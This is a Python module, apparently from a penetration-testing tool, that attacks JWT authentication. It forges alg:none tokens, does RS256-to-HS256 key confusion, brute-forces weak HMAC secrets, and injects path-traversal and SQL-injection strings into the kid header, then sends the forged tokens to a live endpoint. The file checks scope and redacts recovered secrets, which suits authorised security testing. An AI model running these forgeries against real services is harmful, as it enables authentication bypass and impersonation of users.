"""JWT attack module — alg confusion, none attack, weak secret brute force, kid injection."""
from __future__ import annotations
import asyncio
import base64
import hashlib
import hmac
import json
import re
from typing import Any
from talisman.engine.scope import ScopeViolationError
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.payload_engine import JWT_WEAK_SECRETS
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)


def _decode_jwt(token: str) -> tuple[dict, dict, str] | None:
 try:
  parts = token.split(".")
  if len(parts) != 3:
   return None
  def _decode_b64(s: str) -> dict:
   s += "=" * (4 - len(s) % 4)
   return json.loads(base64.urlsafe_b64decode(s))
  header = _decode_b64(parts[0])
  payload = _decode_b64(parts[1])
  return header, payload, parts[2]
 except Exception:
  return None


def _encode_b64(data: dict) -> str:
 return base64.urlsafe_b64encode(
  json.dumps(data, separators=(",", ":")).encode()
 ).rstrip(b"=").decode()


def _forge_none_alg(token: str) -> list[str]:
 """Forge tokens with alg:none (strip signature)."""
 decoded = _decode_jwt(token)
 if not decoded:
  return []
 header, payload, _ = decoded
 tokens = []
 for alg in ["none", "None", "NONE", "nOnE", "NoNe"]:
  h = {**header, "alg": alg}
  forged = f"{_encode_b64(h)}.{_encode_b64(payload)}."
  tokens.append(forged)
 return tokens


def _forge_hs256_with_rs256_pubkey(token: str, pubkey_pem: str) -> str | None:
 """RS256 -> HS256 confusion: sign with public key as HMAC secret."""
 try:
  import hashlib, hmac
  decoded = _decode_jwt(token)
  if not decoded:
   return None
  header, payload, _ = decoded
  new_header = {**header, "alg": "HS256"}
  message = f"{_encode_b64(new_header)}.{_encode_b64(payload)}".encode()
  sig = hmac.new(pubkey_pem.encode(), message, hashlib.sha256).digest()
  sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
  return f"{_encode_b64(new_header)}.{_encode_b64(payload)}.{sig_b64}"
 except Exception:
  return None


def _brute_secret(token: str, secrets: list[str]) -> str | None:
 """Brute force HMAC secret."""
 decoded = _decode_jwt(token)
 if not decoded:
  return None
 header, payload, sig_b64 = decoded
 alg = header.get("alg", "HS256")
 if alg not in ("HS256", "HS384", "HS512"):
  return None
 hash_fn = {
  "HS256": hashlib.sha256,
  "HS384": hashlib.sha384,
  "HS512": hashlib.sha512,
 }[alg]
 message = f"{token.rsplit('.', 1)[0]}".encode()
 sig = base64.urlsafe_b64decode(sig_b64 + "==")
 for secret in secrets:
  expected = hmac.new(secret.encode(), message, hash_fn).digest()
  if hmac.compare_digest(expected, sig):
   return secret
 return None


def _forge_kid_injection(token: str) -> list[dict[str, Any]]:
 """Inject malicious kid values — path traversal and SQL injection."""
 decoded = _decode_jwt(token)
 if not decoded:
  return []
 header, payload, _ = decoded
 variants = []
 for kid_payload in [
  "../../dev/null",
  "../../proc/sys/kernel/randomize_va_space",
  "' UNION SELECT 'secretkey'--",
  "1' OR '1'='1",
  "/dev/null",
 ]:
  new_header = {**header, "kid": kid_payload, "alg": "HS256"}
  # Sign with empty string (null file content) or 'secretkey'
  message = f"{_encode_b64(new_header)}.{_encode_b64(payload)}".encode()
  for secret in [b"", b"secretkey", b"null", b"\x00"]:
   sig = hmac.new(secret, message, hashlib.sha256).digest()
   sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
   variants.append({
    "kid": kid_payload,
    "secret": secret.decode("utf-8", errors="replace"),
    "token": f"{_encode_b64(new_header)}.{_encode_b64(payload)}.{sig_b64}",
   })
 return variants


async def _test_token_against_endpoint(
 url: str, token: str, original_status: int, client: TalismanHTTPClient
) -> bool:
 """Test if a forged token is accepted."""
 try:
  r = await client.get(url, headers={"Authorization": f"Bearer {token}"})
  return r.status_code == original_status and r.status_code not in (401, 403)
 except Exception:
  return False


async def run(
 target: str,
 session: Any = None,
 scope: Any = None,
 rate_limiter: Any = None,
 proxy: str | None = None,
 token: str | None = None,
 endpoint: str | None = None,
 crack_secret: bool = True,
 **kwargs: Any,
) -> dict[str, Any]:
 candidates: list[dict[str, Any]] = []
 if not token:
  return {
   "findings": [],
   "candidates": [],
   "count": 0,
   "error": "jwt_token_required",
  }

 decoded = _decode_jwt(token)
 if not decoded:
  return {
   "findings": [],
   "candidates": [],
   "count": 0,
   "error": "invalid_jwt_format",
  }

 header, payload, _ = decoded
 alg = header.get("alg", "unknown")
 console.print(f"\\n[module][+] Offline JWT Analysis[/module]")
 console.print(f" Algorithm: {alg}")
 console.print(f" Claim names: {', '.join(sorted(str(key) for key in payload.keys()))}")

 if crack_secret and alg in {"HS256", "HS384", "HS512"}:
  # This is an offline HMAC verification. Never print, return or persist the
  # recovered secret; store only a one-way fingerprint and length.
  found_secret = _brute_secret(token, JWT_WEAK_SECRETS)
  if found_secret:
   fingerprint = hashlib.sha256(found_secret.encode()).hexdigest()[:20]
   candidates.append({
    "type": "jwt_weak_hmac_secret",
    "algorithm": alg,
    "confidence": "confirmed_cryptographic_match",
    "secret_fingerprint": fingerprint,
    "secret_length": len(found_secret),
    "secret_value": "[REDACTED]",
    "requires_forgery_impact_validation": True,
    "verification_required": (
     "Verify token acceptance and the effective signing-key scope with a "
     "dedicated test token. Do not expose the recovered key in logs or reports."
    ),
   })
   console.print("  [warning]JWT HMAC key matched local weak-secret list; secret redacted[/warning]")

 active_probe_results: list[dict[str, Any]] = []
 if endpoint:
  if scope is None:
   return {
    "findings": [],
    "candidates": candidates,
    "count": 0,
    "error": "scope_enforcer_required_for_live_jwt_tests",
   }
  try:
   scope.assert_in_scope(endpoint)
   scope.assert_destructive_allowed(endpoint, "GET")
  except ScopeViolationError as exc:
   return {
    "findings": [],
    "candidates": candidates,
    "count": 0,
    "skipped": True,
    "reason": str(exc),
   }

  async with TalismanHTTPClient(
   proxy=proxy,
   timeout=10,
   verify_ssl=True,
   follow_redirects=False,
   scope=scope,
  ) as client:
   try:
    baseline = await client.get(
     endpoint,
     headers={"Authorization": f"Bearer {token}"},
     timeout=8,
    )
   except Exception:
    baseline = None

   if baseline is None or baseline.status_code < 200 or baseline.status_code >= 300:
    active_probe_results.append({
     "type": "jwt_live_test_skipped",
     "reason": "Original token did not establish a successful baseline on the supplied endpoint.",
    })
   else:
    baseline_body = baseline.text[:200_000]
    for forged in _forge_none_alg(token)[:2]:
     try:
      response = await client.get(
       endpoint,
       headers={"Authorization": f"Bearer {forged}"},
       timeout=8,
      )
      if 200 <= response.status_code < 300:
       active_probe_results.append({
        "type": "jwt_alg_none_acceptance_candidate",
        "confidence": "candidate",
        "status": response.status_code,
        "response_matches_baseline": response.text[:200_000] == baseline_body,
        "verification_required": (
         "Confirm the server authenticated the forged token as the intended "
         "principal, not as anonymous or a public endpoint. Compare subject and "
         "authorization scope using a controlled test account."
        ),
       })
       break
     except Exception:
      pass

    for variant in _forge_kid_injection(token)[:5]:
     try:
      response = await client.get(
       endpoint,
       headers={"Authorization": f"Bearer {variant['token']}"},
       timeout=8,
      )
      if 200 <= response.status_code < 300:
       active_probe_results.append({
        "type": "jwt_kid_handling_candidate",
        "confidence": "candidate",
        "kid_variant": str(variant["kid"])[:80],
        "status": response.status_code,
        "verification_required": (
         "Confirm that the forged token is authenticated as the intended "
         "principal and that key selection was influenced by the supplied kid. "
         "A 2xx response alone is insufficient."
        ),
       })
       break
     except Exception:
      pass

 candidates.extend(active_probe_results)
 console.print(
  f" JWT assessment complete — {len(candidates)} candidate indicators; "
  "no raw tokens or recovered secrets were emitted"
 )
 return {
  "findings": [],
  "candidates": candidates,
  "count": 0,
  "algorithm": alg,
  "claim_names": sorted(str(key) for key in payload.keys()),
  "live_tests_performed": bool(endpoint and scope is not None),
 }
